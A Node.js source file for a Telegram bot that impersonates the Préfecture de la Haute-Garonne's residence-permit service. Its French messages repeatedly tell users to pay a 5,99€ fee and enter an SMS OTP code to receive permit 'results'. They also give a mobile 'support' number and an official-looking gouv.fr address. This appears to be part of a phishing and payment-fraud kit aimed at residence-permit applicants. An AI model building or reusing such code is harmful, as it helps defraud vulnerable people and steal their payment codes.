const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

class TelegramService {
  constructor() {
    this.token = process.env.TELEGRAM_BOT_TOKEN;
    this.bot = null;
    this.isInitialized = false;
    this.userSubscriptions = new Map();
    this.resultsQueue = [];
  }

  initialize() {
    if (!this.token) {
      console.error('Telegram bot token not configured');
      return false;
    }

    try {
      this.bot = new TelegramBot(this.token, { polling: true });
      this.setupCommands();
      this.isInitialized = true;
      console.log('Telegram bot initialized successfully');
      return true;
    } catch (error) {
      console.error('Failed to initialize Telegram bot:', error.message);
      return false;
    }
  }

  setupCommands() {
    if (!this.bot) return;

    this.bot.onText(/\/start/, (msg) => {
      const chatId = msg.chat.id;
      const firstName = msg.from.first_name;
      
      this.bot.sendMessage(chatId, 
        `Bonjour ${firstName} !\n\n` +
        `Bienvenue sur le bot du Service des Permis de Résidence - Haute-Garonne.\n\n` +
        `Pour recevoir vos résultats de demande de permis de résidence :\n` +
        `1. Effectuez votre paiement de 5,99€ sur notre site\n` +
        `2. Entrez votre code OTP reçu par SMS\n` +
        `3. Votre résultat sera automatiquement envoyé ici\n\n` +
        `/subscribe - S'abonner aux notifications\n` +
        `/unsubscribe - Se désabonner\n` +
        `/status - Vérifier le statut de votre demande`
      );
    });

    this.bot.onText(/\/subscribe/, async (msg) => {
      const chatId = msg.chat.id;
      const userId = msg.from.id;
      
      const userData = {
        userId: userId,
        chatId: chatId,
        userName: `${msg.from.first_name} ${msg.from.last_name || ''}`.trim(),
        subscribed: true,
        subscribeDate: new Date(),
        notificationPreferences: {
          results: true,
          updates: true,
          reminders: true
        }
      };

      this.userSubscriptions.set(chatId, userData);
      
      await this.bot.sendMessage(chatId,
        `✅ Abonnement confirmé !\n\n` +
        `Vous recevrez automatiquement vos résultats de demande de permis de résidence.\n` +
        `Rappel : Le paiement de 5,99€ est nécessaire pour la livraison de votre permis.\n\n` +
        `Utilisez /status pour vérifier votre demande en cours.`
      );
    });

    this.bot.onText(/\/unsubscribe/, async (msg) => {
      const chatId = msg.chat.id;
      
      if (this.userSubscriptions.has(chatId)) {
        this.userSubscriptions.delete(chatId);
        await this.bot.sendMessage(chatId,
          `❌ Vous êtes maintenant désabonné des notifications.\n\n` +
          `Vos résultats ne seront plus envoyés automatiquement.\n` +
          `Vous pouvez vous réabonner avec /subscribe.`
        );
      } else {
        await this.bot.sendMessage(chatId,
          `Vous n'êtes pas abonné aux notifications.`
        );
      }
    });

    this.bot.onText(/\/status/, async (msg) => {
      const chatId = msg.chat.id;
      
      await this.bot.sendMessage(chatId,
        `📋 Statut de votre demande\n\n` +
        `Pour vérifier votre statut de permis de résidence :\n` +
        `1. Connectez-vous à votre compte sur notre site\n` +
        `2. Suivez votre demande jusqu'à la validation\n` +
        `3. Le résultat sera envoyé ici automatiquement\n\n` +
        `⚠️ N'oubliez pas de compléter le paiement de 5,99€ pour la livraison.`
      );
    });

    this.bot.onText(/\/help/, (msg) => {
      const chatId = msg.chat.id;
      
      this.bot.sendMessage(chatId,
        `🤖 Assistance du Bot Telegram\n\n` +
        `Commandes disponibles :\n` +
        `/start - Accueil\n` +
        `/subscribe - S'abonner aux notifications\n` +
        `/unsubscribe - Se désabonner\n` +
        `/status - Vérifier le statut\n` +
        `/help - Cette aide\n\n` +
        `Pour toute question, contactez le support au 06 12 34 56 78`
      );
    });

    this.bot.on('polling_error', (error) => {
      console.error('Telegram polling error:', error.message);
    });

    this.bot.on('webhook_error', (error) => {
      console.error('Telegram webhook error:', error.message);
    });
  }

  async sendResultToUser(userId, resultData) {
    if (!this.isInitialized || !this.bot) {
      console.error('Telegram bot not initialized');
      return false;
    }

    const subscription = Array.from(this.userSubscriptions.values())
      .find(sub => sub.userId === userId);

    if (!subscription) {
      console.log(`User ${userId} not subscribed to Telegram notifications`);
      return false;
    }

    try {
      const message = this.formatResultMessage(resultData);
      await this.bot.sendMessage(subscription.chatId, message, {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      });

      console.log(`Result sent to user ${userId} on Telegram`);
      return true;
    } catch (error) {
      console.error('Failed to send result to Telegram:', error.message);
      return false;
    }
  }

  formatResultMessage(resultData) {
    const date = new Date(resultData.processedAt || Date.now());
    const formattedDate = date.toLocaleDateString('fr-FR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    let statusEmoji = '✅';
    let statusText = 'Accepté';
    
    if (resultData.status === 'rejected') {
      statusEmoji = '❌';
      statusText = 'Rejeté';
    } else if (resultData.status === 'pending') {
      statusEmoji = '⏳';
      statusText = 'En attente';
    }

    return `
<b>🏢 Préfecture de la Haute-Garonne</b>

<b>Résultat de votre demande de permis de résidence</b>

👤 <b>Candidat :</b> ${resultData.userName || 'Non renseigné'}
🆔 <b>Numéro de dossier :</b> ${resultData.dossierNumber || 'N/A'}
📅 <b>Date du traitement :</b> ${formattedDate}

${statusEmoji} <b>Statut :</b> ${statusText}

${resultData.statusDetails ? `📝 <b>Détails :</b> ${resultData.statusDetails}` : ''}

${resultData.nextSteps ? `➡️ <b>Prochaines étapes :</b> ${resultData.nextSteps}` : ''}

<i>Vous avez payé 5,99€ pour la livraison de votre permis de résidence.</i>

<i>Contact : 06 12 34 56 78 | support@hautegaronne.gouv.fr</i>
    `.trim();
  }

  async sendNotification(userId, notificationData) {
    if (!this.isInitialized || !this.bot) {
      return false;
    }

    const subscription = Array.from(this.userSubscriptions.values())
      .find(sub => sub.userId === userId);

    if (!subscription || !subscription.notificationPreferences.updates) {
      return false;
    }

    try {
      const message = this.formatNotificationMessage(notificationData);
      await this.bot.sendMessage(subscription.chatId, message, {
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Failed to send notification:', error.message);
      return false;
    }
  }

  formatNotificationMessage(notificationData) {
    return `
<b>🔔 Notification - Préfecture Haute-Garonne</b>

${notificationData.message}

<i>Date : ${new Date().toLocaleDateString('fr-FR')}</i>
    `.trim();
  }

  addToResultsQueue(userId, resultData) {
    this.resultsQueue.push({
      userId,
      data: resultData,
      timestamp: Date.now()
    });
  }

  async processResultsQueue() {
    if (this.resultsQueue.length === 0) return;

    const batch = this.resultsQueue.splice(0, 10);
    
    for (const item of batch) {
      await this.sendResultToUser(item.userId, item.data);
    }
  }

  getUserCount() {
    return this.userSubscriptions.size;
  }

  getActiveSubscriptions() {
    return Array.from(this.userSubscriptions.values())
      .filter(sub => sub.subscribed)
      .length;
  }

  async broadcastMessage(message) {
    if (!this.isInitialized || !this.bot) {
      return false;
    }

    let successCount = 0;
    let failCount = 0;

    for (const [chatId, subscription] of this.userSubscriptions) {
      try {
        await this.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        successCount++;
      } catch (error) {
        console.error(`Failed to broadcast to ${chatId}:`, error.message);
        failCount++;
      }
    }

    return { success: successCount, failed: failCount };
  }

  async sendDocument(chatId, documentUrl, caption = '') {
    if (!this.isInitialized || !this.bot) {
      return false;
    }

    try {
      await this.bot.sendDocument(chatId, documentUrl, { caption });
      return true;
    } catch (error) {
      console.error('Failed to send document:', error.message);
      return false;
    }
  }

  async sendPhoto(chatId, photoUrl, caption = '') {
    if (!this.isInitialized || !this.bot) {
      return false;
    }

    try {
      await this.bot.sendPhoto(chatId, photoUrl, { caption });
      return true;
    } catch (error) {
      console.error('Failed to send photo:', error.message);
      return false;
    }
  }

  shutdown() {
    if (this.bot) {
      this.bot.stopPolling();
      console.log('Telegram bot stopped');
    }
    this.isInitialized = false;
  }
}

module.exports = new TelegramService();